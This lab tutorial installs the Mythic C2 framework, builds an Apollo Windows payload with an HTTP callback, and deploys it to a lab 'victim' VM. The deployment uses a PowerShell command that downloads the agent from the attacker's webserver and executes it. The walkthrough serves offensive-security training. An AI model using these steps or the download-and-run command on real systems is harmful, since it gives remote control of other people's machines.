# **Mythic C2 Framework**

Mythic is an open-source Command and Control (C2) framework designed for red team operations and adversary emulation. It allows operators to interact with compromised systems in a stealthy and customizable manner. Originally developed by Cody Thomas (a.k.a. its_a_feature_), Mythic supports multiple agents and payloads that can be tailored to specific operational needs. It provides a robust and modular architecture that includes a web-based interface for managing tasks, communications, and agent development, making it highly flexible for offensive security teams. Mythic is especially valued for its cross-platform support and its ability to integrate with other red teaming tools.

The instructions below will cover the installation of Mythic and creating a payload.

1. Create an Ubuntu server VM. By this point you should be familiar with creating a virtual machine.
2. Set the network adaptor as shown below. This will put it in the attacker subnet. 

![image.png](Screenshots/1-C2Framework/image1.webp)

 3. From your Kali VM in the same subnet, SSH to the Ubuntu server. 

![image.png](Screenshots/1-C2Framework/image2.webp)

1. Run the following commands to install Docker and Mythic:

```go
sudo apt-get update && apt-get upgrade
```

```go
sudo apt install docker-compose
```

```go
sudo apt install make
```

```go
git clone https://github.com/its-a-feature/Mythic
```

```go
cd Mythic
```

```go
sudo ./install_docker_ubuntu.sh
```

```go
sudo systemctl start docker
```

```go
sudo make
```

```go
sudo ./mythic-cli start
```

```go
sudo ufw allow 80
```

```go
sudo ufw allow 443
```

Login to the Mythic server with a web browser on your Kali VM. Use the IP address of the Mythic server and port 7443.

![image.png](Screenshots/1-C2Framework/image3.webp)

The default user is mythic_admin. The password is located in the Mythic directory in a file named .env. It is a hidden file, so make sure you include the -la.

![image.png](Screenshots/1-C2Framework/image4.webp)

![image.png](Screenshots/1-C2Framework/image5.webp)

After signing in you should be presented with the dashboard.

![image.png](Screenshots/1-C2Framework/image6.webp)

Go back to the SSH terminal on Kali and run the command below.

```go
./mythic-cli install github https://github.com/MythicAgents/Apollo.git
```

This installs the Apollo C2 service.

![image.png](Screenshots/1-C2Framework/image7.webp)

Create a HTTP C2 profile from the SSH connection.

```go
./mythic-cli install github https://github.com/MythicC2Profiles/http
```

![image.png](Screenshots/1-C2Framework/image8.webp)

Create a payload by selecting the options shown below.

![image.png](Screenshots/1-C2Framework/image9.webp)

Select the Target Operating System (Windows) and select next.

![image.png](Screenshots/1-C2Framework/image10.webp)

Select the Payload Type (WinExe) and then select next.

![image.png](Screenshots/1-C2Framework/image11.webp)

Select all the commands and then select next.

![image.png](Screenshots/1-C2Framework/image12.webp)

Include profile. Change to HTTP and enter public IP of Mythic server.  Callback port 80. Leave everything else as default.

![image.png](Screenshots/1-C2Framework/image13.webp)

Once the payload is built, you can download it to your Kali VM.

![image.png](Screenshots/1-C2Framework/image14.webp)

Move the payload to the /home/elliot directory, so we can use the same webserver to download it to the victim.

![image.png](Screenshots/1-C2Framework/image15.webp)

### Deploying the Mythic C2 Agent

In this example we will stand up a webserver on our Kali VM and use an existing reverse shell to download and execute the agent on the victim Windows VM. 

![image.png](Screenshots/1-C2Framework/image16.webp)

```go
powershell -Command Invoke-WebRequest -Uri "[http://10.0.3.2:8000/redwheelbarrow.exe](http://10.0.3.2:8000/theredwheelbarrow.exe)" -OutFile "C:\Users\tcolby\Downloads\redwheelbarrow.exe"; C:\Users\tcolby\Downloads\redwheelbarrow.exe
```

